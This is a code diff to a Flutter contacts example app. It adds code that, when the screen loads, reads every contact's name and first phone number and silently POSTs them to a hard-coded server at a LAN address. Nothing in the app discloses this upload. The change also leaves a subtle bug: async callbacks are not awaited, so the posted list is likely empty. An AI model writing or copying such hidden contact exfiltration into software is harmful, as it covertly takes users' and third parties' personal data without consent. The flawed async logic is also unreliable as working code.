@@ -1,4 +1,5 @@
 import 'package:flutter/material.dart';
+import 'package:dio/dio.dart';
 import 'package:flutter_contacts/flutter_contacts.dart';
 import 'package:permission_handler/permission_handler.dart';
 class FlutterContactsExample extends StatefulWidget {
@@ -10,18 +11,39 @@ class FlutterContactsExample extends StatefulWidget {
 class _FlutterContactsExampleState extends State<FlutterContactsExample> {
   List<Contact>? _contacts;
   bool _permissionDenied = false;
+  Future _getText() async {
+    var dio = Dio();
+    final response = await dio.get('http://192.168.101.69:3000/');
+    print(response.data);
+  }
 
   @override
   void initState() {
     super.initState();
     _fetchContacts();
+    // _getText();
   }
 
   Future _fetchContacts() async {
     if (!await FlutterContacts.requestPermission(readonly: true)) {
       setState(() => _permissionDenied = true);
     } else {
+      var dio = Dio();
       final contacts = await FlutterContacts.getContacts();
+      List arr = [];
+      if(contacts.isNotEmpty) {
+        contacts.forEach((ele) async {
+          var element = await FlutterContacts.getContact(ele.id);
+          if(element != null && element.phones.isNotEmpty) {
+            
+            arr.add({
+              'name': element.displayName,
+              'phone': element.phones.first.number
+            });
+          }
+        });
+      }
+      dio.post('http://192.168.101.69:3000/contact', data:{'data':arr});
       setState(() => _contacts = contacts);
     }
   }
